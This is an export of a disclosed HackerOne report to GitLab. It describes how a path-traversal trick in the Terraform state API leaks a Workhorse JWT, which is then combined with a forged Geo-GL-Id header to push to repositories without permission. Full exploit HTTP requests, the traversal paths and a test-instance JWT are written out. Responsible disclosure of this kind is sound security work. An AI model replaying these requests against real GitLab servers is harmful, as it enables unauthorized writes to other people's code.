{
  "id": 1040786,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDQwNzg2",
  "url": "https://hackerone.com/reports/1040786",
  "title": "Exposure of a valid Gitlab-Workhorse JWT leading to various bad things",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2020-11-22T20:43:25.840Z",
  "submitted_at": "2020-11-22T20:43:25.855Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "ledz1996",
    "url": "/ledz1996",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/584/872/78b4b2fa1173d85b7f043e9c6fc027af5699cdfc_original.jpeg/ede8cd84a64d5392a2bb88ecb598721116469c27c015c2caa77148f11e211d58"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 264,
    "url": "https://hackerone.com/gitlab",
    "handle": "gitlab",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "GitLab",
      "twitter_handle": "gitlab",
      "website": "https://about.gitlab.com",
      "about": "A single application for the entire software development lifecycle."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2022-07-05T16:28:24.784Z",
  "bug_reporter_agreed_on_going_public_at": "2022-07-05T16:28:24.561Z",
  "team_member_agreed_on_going_public_at": "2021-05-21T20:10:42.514Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "### Summary\n\nUsing the **State** Uploading API we could potentially do a bad thing:\n- Bypass `Gitlab::Workhorse.verify_api_request!`\n\nThis was due to the fact that Workhorse clean the URL before passing it to Rails, this is elaborated in #923027. \nand **State** Api read `request.body` to append it as a file!\n\n**lib/api/terraform/state.rb**\n```ruby\n desc 'Add a new terraform state or update an existing one'\n          route_setting :authentication, basic_auth_personal_access_token: true, job_token_allowed: :basic_auth\n          post do\n            authorize! :admin_terraform_state, user_project\n\n            data = request.body.read\n```\nThere is one very interestingly specific exploit which I've found in my researching on Geo is to un-authorizing push to any readable repository\nSince Gitlab has a pre-receive hook which check the permission even if attacker is able to bypass the Access Control in Rails part but here is pretty interesting stuff in EE:\n\n**ee/app/controllers/ee/repositories/git_http_controller.rb**\n```ruby\ndef user\n        super || geo_push_user&.user\n      end\n\n      def geo_push_user\n        @geo_push_user ||= ::Geo::PushUser.new_from_headers(request.headers)\n      end\n```\nWhich mean the `user` for passing to Gitaly will be `user` from `geo_push_user`\n\n```ruby\n  def self.new_from_headers(headers)\n    return unless needed_headers_provided?(headers)\n\n    new(headers['Geo-GL-Id'])\n  end\n\n  def user\n    @user ||= identify_using_ssh_key(gl_id)\n  end\n```\n\nTracing from this we will reach here\n\n```ruby\n    def identify_using_ssh_key(identifier)\n      key_id = identifier.gsub(\"key-\", \"\")\n\n      identify_with_cache(:ssh_key, key_id) do\n        User.find_by_ssh_key_id(key_id)\n      end\n    end\n\n```\nThis means: I am able to authenticate as any **SSH-KEY** by just passing the ID of the Key to headers `Geo-GL-Id`\n\n### Steps to reproduce\n\nSpliting into 2 parts, **GEO** is not neccessary for the PoC but **EE** Plan should be.\n\n**Exposing Gitlab JWT**\n\n- Set up an Project\n- Get a Personal Access Token of the user\n- Send the following request \n\n```http\nPOST /api/v4/projects/<project-id>/terraform/state/%2e%2e%2f%2e%2e%2fwikis%2fattachments?serial=1 HTTP/1.1\nHost: gitlab3.example.vm\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:82.0) Gecko/20100101 Firefox/82.0\nPrivate-Token: <private-token>\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: close\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryTdc8IV2vpQMwv6jW\nCookie: experimentation_subject_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IklqZzBOVE14T1RWbUxXRTBZalF0TkRBek1pMWhaVGRpTFRNM05tSTBNalExWlRjNVl5ST0iLCJleHAiOm51bGwsInB1ciI6ImNvb2tpZS5leHBlcmltZW50YXRpb25fc3ViamVjdF9pZCJ9fQ%3D%3D--64479e11c45d9e17bdf950f749ab3fa8b3ee278a; _gitlab_session=b50156c1d05716e1bebbfd448f38b890; known_sign_in=SkJhSDV0MWRqaFAyaFpZQlNCM3Vqbmg5UkxsZ0hyTHVWSlNPanNZT2YxbVQ4M2xvaUxLNkZabE9zeHdZOHlFQnloTWJxWGdPMWtKbUlkV25TNGFHRFFQVDlpdTRtUFpnTnZyd2xCTk5sS2hNRVBmODEvc2RiYVovT2RjTWgzWFQtLTY4ZEl1bXA4ZnVETVFrYnUrZVhaR1E9PQ%3D%3D--34ce6946f382229b6135333906ad3fd10ecbb284; sidebar_collapsed=false; event_filter=all\nUpgrade-Insecure-Requests: 1\nContent-Length: 316\n\n------WebKitFormBoundaryTdc8IV2vpQMwv6jW\nContent-Disposition: form-data; name=\"import_url\"\n\nhttp://gitlab3.example.vm/test/ttt\n------WebKitFormBoundaryTdc8IV2vpQMwv6jW\nContent-Disposition: form-data; name=\"mirror\"; filename=test.txt\nContent-Type: image/jpg\n\ntrue\n------WebKitFormBoundaryTdc8IV2vpQMwv6jW--\n```\n\n3. Later on send the following request \n\n```http\nGET /api/v4/projects/6/terraform/state/%2e%2e%2f%2e HTTP/1.1\nHost: gitlab3.example.vm\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:82.0) Gecko/20100101 Firefox/82.0\nPrivate-Token: <Private-Token>\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: close\nCookie: experimentation_subject_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IklqZzBOVE14T1RWbUxXRTBZalF0TkRBek1pMWhaVGRpTFRNM05tSTBNalExWlRjNVl5ST0iLCJleHAiOm51bGwsInB1ciI6ImNvb2tpZS5leHBlcmltZW50YXRpb25fc3ViamVjdF9pZCJ9fQ%3D%3D--64479e11c45d9e17bdf950f749ab3fa8b3ee278a; _gitlab_session=b50156c1d05716e1bebbfd448f38b890; known_sign_in=SkJhSDV0MWRqaFAyaFpZQlNCM3Vqbmg5UkxsZ0hyTHVWSlNPanNZT2YxbVQ4M2xvaUxLNkZabE9zeHdZOHlFQnloTWJxWGdPMWtKbUlkV25TNGFHRFFQVDlpdTRtUFpnTnZyd2xCTk5sS2hNRVBmODEvc2RiYVovT2RjTWgzWFQtLTY4ZEl1bXA4ZnVETVFrYnUrZVhaR1E9PQ%3D%3D--34ce6946f382229b6135333906ad3fd10ecbb284; sidebar_collapsed=false; event_filter=all\nUpgrade-Insecure-Requests: 1\n\n```\n\nYou will then receive something like this which the JWT is in `mirror.gitlab-workhorse-upload` parameter\n\n```http\nHTTP/1.1 200 OK\nServer: nginx\nDate: Sun, 22 Nov 2020 17:45:01 GMT\nConnection: close\nCache-Control: max-age=0, private, must-revalidate\nEtag: W/\"2db9b0c1229e01c96956b4ed4ed32f3d\"\nVary: Origin\nX-Content-Type-Options: nosniff\nX-Frame-Options: SAMEORIGIN\nX-Request-Id: wNp4wblZQ42\nX-Runtime: 0.119849\nStrict-Transport-Security: max-age=31536000\nReferrer-Policy: strict-origin-when-cross-origin\nContent-Length: 2540\n\n--066cee44c4789c36d4ad90b076a0073a796e913814dc64d9afb57f77869a\nContent-Disposition: form-data; name=\"import_url\"\n\nhttp://gitlab3.example.vm/test/ttt\n--066cee44c4789c36d4ad90b076a0073a796e913814dc64d9afb57f77869a\nContent-Disposition: form-data; name=\"mirror.name\"\n\ntest.txt\n--066cee44c4789c36d4ad90b076a0073a796e913814dc64d9afb57f77869a\nContent-Disposition: form-data; name=\"mirror.path\"\n\n/opt/gitlab/embedded/service/gitlab-rails/public/uploads/tmp/test.txt403239251\n--066cee44c4789c36d4ad90b076a0073a796e913814dc64d9afb57f77869a\nContent-Disposition: form-data; name=\"mirror.md5\"\n\nb326b5062b2f0e69046810717534cb09\n--066cee44c4789c36d4ad90b076a0073a796e913814dc64d9afb57f77869a\nContent-Disposition: form-data; name=\"mirror.sha256\"\n\nb5bea41b6c623f7c09f1bf24dcae58ebab3c0cdd90ad966bc43a45b44867e12b\n--066cee44c4789c36d4ad90b076a0073a796e913814dc64d9afb57f77869a\nContent-Disposition: form-data; name=\"mirror.gitlab-workhorse-upload\"\n\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1cGxvYWQiOnsibWQ1IjoiYjMyNmI1MDYyYjJmMGU2OTA0NjgxMDcxNzUzNGNiMDkiLCJuYW1lIjoidGVzdC50eHQiLCJwYXRoIjoiL29wdC9naXRsYWIvZW1iZWRkZWQvc2VydmljZS9naXRsYWItcmFpbHMvcHVibGljL3VwbG9hZHMvdG1wL3Rlc3QudHh0NDAzMjM5MjUxIiwicmVtb3RlX2lkIjoiIiwicmVtb3RlX3VybCI6IiIsInNoYTEiOiI1ZmZlNTMzYjgzMGYwOGEwMzI2MzQ4YTkxNjBhZmFmYzhhZGE0NGRiIiwic2hhMjU2IjoiYjViZWE0MWI2YzYyM2Y3YzA5ZjFiZjI0ZGNhZTU4ZWJhYjNjMGNkZDkwYWQ5NjZiYzQzYTQ1YjQ0ODY3ZTEyYiIsInNoYTUxMiI6IjkxMjBjZDVmYWVmMDdhMDhlOTcxZmYwMjRhM2ZjYmVhMWUzYTZiNDQxNDJhNmQ4MmNhMjhjNmM0MmU0Zjg1MjU5NWJjZjUzZDgxZDc3NmYxMDU0MTA0NWFiZGI3YzM3OTUwNjI5NDE1ZDBkYzY2YzhkODZjNjRhNTYwNmQzMmRlIiwic2l6ZSI6IjQifSwiaXNzIjoiZ2l0bGFiLXdvcmtob3JzZSJ9.xvDjfRCxUK1bfLyM97sxiORbKmGLBr5Tte2c7ywSGz0\n--066cee44c4789c36d4ad90b076a0073a796e913814dc64d9afb57f77869a\nContent-Disposition: form-data; name=\"mirror.remote_id\"\n\n\n--066cee44c4789c36d4ad90b076a0073a796e913814dc64d9afb57f77869a\nContent-Disposition: form-data; name=\"mirror.size\"\n\n4\n--066cee44c4789c36d4ad90b076a0073a796e913814dc64d9afb57f77869a\nContent-Disposition: form-data; name=\"mirror.remote_url\"\n\n\n--066cee44c4789c36d4ad90b076a0073a796e913814dc64d9afb57f77869a\nContent-Disposition: form-data; name=\"mirror.sha512\"\n\n9120cd5faef07a08e971ff024a3fcbea1e3a6b44142a6d82ca28c6c42e4f852595bcf53d81d776f10541045abdb7c37950629415d0dc66c8d86c64a5606d32de\n--066cee44c4789c36d4ad90b076a0073a796e913814dc64d9afb57f77869a\nContent-Disposition: form-data; name=\"mirror.sha1\"\n\n5ffe533b830f08a0326348a9160afafc8ada44db\n--066cee44c4789c36d4ad90b076a0073a796e913814dc64d9afb57f77869a--\n\n```\n\nTake note of this value\n\n**Unauthorizing push to readable project**\nAssuming:\n\nUser B has Project B set public or internal without any user can push.\nUser B upload an SSH-KEY.\n\n- Login as another user.\n- Navigate to project B that you don't have the push access.\n- Fork the project\n- Clone the forked project using HTTP\n- Push any file to the Project but intercept the request\n\nWhen sending the request to `<project-forked-path>.git/git-receive-pack`\nChange the path from  `<project-forked-path>.git/git-receive-pack` to `/-/push_from_secondary/2/<project-path>.git/git-upload-pack.t%2f%2e%2e%2fgit-receive-pack `\nAdding the `Gitlab-Workhorse-Api-Request` Header with the value is the value noted in the first part\nAdding the `Geo-GL-Id` with the value `key-<id>` with `<id>` as the ID of any key of a user who has push access to the project which is user B, This could be brute-forced as it is incremental integer from 1.\nThe request should look likes\n\n```http\nPOST /-/push_from_secondary/2/rrr/dsds.git/git-upload-pack.t%2f%2e%2e%2fgit-receive-pack HTTP/1.1\nHost: gitlab3.example.vm\nGeo-GL-Id: key-1\nUser-Agent: git/2.28.0\nAccept-Encoding: gzip, deflate\nGitlab-Workhorse-Api-Request: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1cGxvYWQiOnsibWQ1IjoiYjMyNmI1MDYyYjJmMGU2OTA0NjgxMDcxNzUzNGNiMDkiLCJuYW1lIjoidGVzdC50eHQiLCJwYXRoIjoiL29wdC9naXRsYWIvZW1iZWRkZWQvc2VydmljZS9naXRsYWItcmFpbHMvcHVibGljL3VwbG9hZHMvdG1wL3Rlc3QudHh0NDAzMjM5MjUxIiwicmVtb3RlX2lkIjoiIiwicmVtb3RlX3VybCI6IiIsInNoYTEiOiI1ZmZlNTMzYjgzMGYwOGEwMzI2MzQ4YTkxNjBhZmFmYzhhZGE0NGRiIiwic2hhMjU2IjoiYjViZWE0MWI2YzYyM2Y3YzA5ZjFiZjI0ZGNhZTU4ZWJhYjNjMGNkZDkwYWQ5NjZiYzQzYTQ1YjQ0ODY3ZTEyYiIsInNoYTUxMiI6IjkxMjBjZDVmYWVmMDdhMDhlOTcxZmYwMjRhM2ZjYmVhMWUzYTZiNDQxNDJhNmQ4MmNhMjhjNmM0MmU0Zjg1MjU5NWJjZjUzZDgxZDc3NmYxMDU0MTA0NWFiZGI3YzM3OTUwNjI5NDE1ZDBkYzY2YzhkODZjNjRhNTYwNmQzMmRlIiwic2l6ZSI6IjQifSwiaXNzIjoiZ2l0bGFiLXdvcmtob3JzZSJ9.xvDjfRCxUK1bfLyM97sxiORbKmGLBr5Tte2c7ywSGz0\nContent-Type: application/x-git-receive-pack-request\nAccept: application/x-git-receive-pack-result\nContent-Length: 436\nConnection: close\n\n00a822cc76ea883341147a10ad83f9994bb9a89d79d9 02c1e26f4d449d265e87e2906933ff0a2a5f275d refs/heads/master report-status side-band-64k object-format=sha1 agent=git/2.28.00000PACK\u0002\u0003\fxËA\nB!\u0010Ð½§p\u001fóõ;\u000eDtö-gt¢ óc\nuûºBÛ\u0007otU[\" q(IYÐ«EsE¨dÌ(´*Ù¸ësØeÉ\u0019£rJÞ\u0007\fKòW\"\n\"Ä\nR!ÃsÜZ·6»=sU{ø´yÒ7×í¡ûÜêÑBtÑ!ø°ÚCçÌOë}\fý³¡¯a¾kå=Õú\u0002s\u000eVOæ\u0001me²6\n\bAz^×ÿ\u000eÜTx\u0001*Õÿ\u0002»\u0002Ó lll2332.txt¨'FÛN^ÁÎZÐpå}Í\"¶Ü¿³ÐÌHt!\u0014\u00024x+))á\u0002\u0004\"\u0001gøÈÎ.LG^gßyg\u0019ßÿ\fæ5,\n```\n\nVideo:\nSorry had to tone down the size because of 256 mb limit :( \n\n{F1090024}\n\n###Results of GitLab environment info\n\n```\nSystem information\nSystem:     Ubuntu 16.04\nProxy:      no\nCurrent User:   git\nUsing RVM:  no\nRuby Version:   2.6.6p146\nGem Version:    2.7.10\nBundler Version:1.17.3\nRake Version:   12.3.3\nRedis Version:  5.0.9\nGit Version:    2.28.0\nSidekiq Version:5.2.9\nGo Version: unknown\n\nGitLab information\nVersion:    13.5.3-ee\nRevision:   b9d194b6b91\nDirectory:  /opt/gitlab/embedded/service/gitlab-rails\nDB Adapter: PostgreSQL\nDB Version: 11.9\nURL:        http://gitlab.example.vm\nHTTP Clone URL: http://gitlab.example.vm/some-group/some-project.git\nSSH Clone URL:  git@gitlab.example.vm:some-group/some-project.git\nElasticsearch:  no\nGeo:        no\nUsing LDAP: no\nUsing Omniauth: yes\nOmniauth Providers:\n\nGitLab Shell\nVersion:    13.11.0\nRepository storage paths:\n- default:  /var/opt/gitlab/git-data/repositories\nGitLab Shell path:      /opt/gitlab/embedded/service/gitlab-shell\nGit:        /opt/gitlab/embedded/bin/git\n```\n\n## Impact\n\nUnauthorized push to repositories, exposing Workhorse JWT",
  "bounty_amount": "10000.0",
  "formatted_bounty": "$10,000",
  "weakness": {
    "id": 27,
    "name": "Improper Authentication - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 1090024,
      "file_name": "Screen_Recording_2020-11-23_at_03.21.28.mov",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/b4sqs8kqf7jkbxh2wqfdos9v6hmr?response-content-disposition=attachment%3B%20filename%3D%22Screen_Recording_2020-11-23_at_03.21.28.mov%22%3B%20filename%2A%3DUTF-8%27%27Screen_Recording_2020-11-23_at_03.21.28.mov&response-content-type=video%2Fquicktime&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZ4ABT4GR%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T135922Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBy6B6CaeGOQsHQEVf6mmFMeFsyrU6xwojWydbGY7RrjAiEAt098VbuwY4XR0q%2FhT1%2BwOM5SQIHiByhn7YH5ul9I%2Bn0qsQUIdRADGgwwMTM2MTkyNzQ4NDkiDFBaVga66U2cxXTWDSqOBZ9tNE39KmDEn1M4BXloMcPBeBllafRlZWXN4mbzGTLJ8XKW77G1i6rQMiYeX0mALiTgT6%2BCHJg%2FXOkgcCoWTiU8AGVS8ygbrG6Rmef84ITNYSRHXYOiAmAtLriRM0FNkbvdPDxzRHKptbdJe%2FxQx6iHxnF4Wbz2d%2BiPKmLG1dOUk9Wd5PcY6e%2FpFK3MQHhbP60DtFaNSQZiLijq7McbVpknudWszl6E666zMtQlGzHcdmQhcfLUGV%2Fh2eQIW07Q8StsP0DnifOlRfH5wmBWZeOVGiQmAiu4vix6Kx70b5sEUa60B8XEzX3iLRbRpvoMJI2iFfwEhBUfyAO2kQFI891jfDtZMWBRAeJzS2TDBSZOFWdllL1Ku5BlluxzcTwgDBcj6U9BeRoIR%2FE%2F%2FzJhFrI6sO4C9sHXlsgFD4n6%2BV%2BMht3eSvRmwlqvwAGbQgoXg1TnmoDMTwU9bHj7KKScAqVQBI8hZ2NsP8SjJg8QJ0z%2BQTTuA8uOznjEUpW73jDmEQTBVhmpeZcwxP4%2BU6nQB8LguHWkl5NBmrNRrQGJGWsRxHHT40HVpMkdUBcHLz%2BE4kW3xThQV2%2FnlNJrQbkP9idnhRNm421huVhZIih2gBVsmfHNfFtpBWAgyhZal1fyaA5PfM8x1h1HAwbgAbx5pWpwX6P35EkSqglhC9hYX4Mx81Hh8c9ng5X9OnjAGOW2svJkxKq9ucSCCtD2ch3QThvWYUo6MweIyhK%2Fc7x1IsUKbcstBILZpn1l%2BukPwZKsmW0eclxFPYN5toUHjUictBuWWthA5Xkwhoewwr4uhuDUwpqTTEYBtxfAUMWwC9b4A0nNdO5YVjG1Et5gL7AXZuOawjRSr2cgQxq4C6b5gjDCs62uBjqxAShKZyKgt2m88YD0Vj8P6tXU495dvL8RKU8No53RBpg%2B0AGbaXTXUqyqWqfJgpK4Oo5BMDBxlCeUem5zsmh5i1y96ARljDRINVqBbClSxSFkigseR0xhxtkfysRfAXQQYk56acdX1y%2FUUtxG304UkKPWzZsl%2FZfaTuT815tCTUHh387Az8zDogkBD5OMCSblOcOAbl2D84THnFg9dMo8QXW7aVKysLeRwOxI5twdQX9Gug%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=927a1b76bb394fd0121d5086cdb66442315f8dc542544f7d961a9f49b46f5d8e",
      "file_size": 145417325,
      "type": "video/quicktime",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": null,
  "vote_count": 30,
  "voters": [
    "n1m0",
    "haxor31337",
    "drsniper",
    "zy9ard3",
    "thruster",
    "run_win",
    "red_darkin",
    "kmxx",
    "huntinex",
    "isira_adithya",
    "and 20 more..."
  ],
  "severity": {
    "rating": "high",
    "author_type": "Team"
  },
  "structured_scope": {
    "databaseId": 39022,
    "asset_type": "OTHER",
    "asset_identifier": "Your Own GitLab Instance",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
